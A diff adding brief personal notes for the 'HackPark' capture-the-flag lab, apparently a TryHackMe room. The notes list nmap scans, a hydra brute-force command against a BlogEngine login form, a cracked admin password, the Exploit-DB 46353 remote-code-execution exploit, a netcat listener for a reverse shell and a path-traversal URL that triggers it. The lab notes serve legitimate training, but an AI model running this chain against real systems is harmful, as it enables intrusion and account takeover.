@@ -1,0 +1,38 @@
+HackPark
+
+ping 10.10.89.224 Not ping/ Maybe ICMP req not allowd
+
+nmap -sV 10.10.89.224 -Pn
+nmap -sV -sC -p- 10.10.89.224 -Pn 
+
+Microsoft IIS httpd 8.5 Port= 80
+
+Login Page: Bruteforece
+
+Exploitation:
+
+Try wrong cred -> Shift+Ctrl+I -> Network -> click login req -> click send -> copy POST req Body part.
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.186.82 http-post-form "/Account/login.aspx:__VIEWSTATE=zvSvWSZF83usc64V86aMzM4XPhUpqOw22kpKu38tD%2FGeMZz9EmP98mpR7rBSG8Qngnf8hCORpBRNS%2BA7WyPHP3TZPZRloeT7IdekZYkTIHLj8U1VrvpfvZv3E8bvmxSRiPpIZ9tHRAPiobV1dUYfWpkD47EiAM2DUyZiIjvD%2B8tm8cMX&__EVENTVALIDATION=BX0pB3Y7DuPjcb5ZTsmzFshXD4nutLHvVPTwyLQK2rFqKTuJDlxLl7kutXVLjE%2BNwWX5e9ehKIn16MOW9uwnAnst8VWk2h64kdS25wZtaZeqRmVNgiLQsNlB8%2FAMxJp5qNsM4HJmmxojDDjCkqvpnxdd3jI3X5E6viz6zSNFs2n6xLYz&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
+
+admin:1qaz2wsx
+
+Login -> click about -> version found -> search exploit.
+
+https://www.exploit-db.com/exploits/46353
+searchsploit blogengine 3.3.6 remote
+searchsploit -x 46353
+cp /usr/share/exploitdb/exploits/aspx/webapps/46353.cs PostView.ascx
+nano PostView.ascx
+# change IP or Port.
+
+Goto wb -> click Content -> click new -> click file manger -> upload file.
+
+nc -lvnp 4445
+
+http://10.10.10.10/admin/app/editor/editpost.cshtml
+http://10.10.10.10/?theme=../../App_Data/files
+
+
+
+
